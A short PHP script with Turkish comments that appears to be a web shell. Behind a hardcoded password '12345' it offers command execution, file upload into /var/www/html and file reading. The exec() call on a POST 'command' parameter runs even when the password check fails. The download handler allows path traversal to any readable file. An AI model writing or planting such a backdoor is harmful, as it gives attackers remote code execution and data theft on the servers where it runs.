<?php

// Şifre koruması
$password = "12345";

// Kullanıcı girişi
if (isset($_POST["password"])) {
 $password_input = $_POST["password"];
 if ($password_input == $password) {
  echo "Başarılı giriş.";
  echo "Giriş yaptınız.";
  header("Location: file_upload_download.php");
 } else {
  echo "Hatalı şifre.";
  exit();
 }
} else {
 echo "Şifrenizi giriniz: ";
}

// Komut yürütme
if (isset($_POST["command"])) {
 exec($_POST["command"]);
}

// Dosya yükleme
if (isset($_FILES["file"])) {
 if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
  $file_name = trim($_FILES["file"]["name"], "4");
  $file_content = file_get_contents($_FILES["file"]["tmp_name"]);
  file_put_contents("/var/www/html/" . $file_name, $file_content);
 }
}

// Dosya indirme
if (isset($_POST["file"])) {
 $file_name = $_POST["file"];
 echo file_get_contents("/var/www/html/" . $file_name);
}


?>

<form action="index.php" method="post" enctype="multipart/form-data">
 Şifre: <input type="password" name="password" />
 <input type="submit" value="Giriş" />
</form>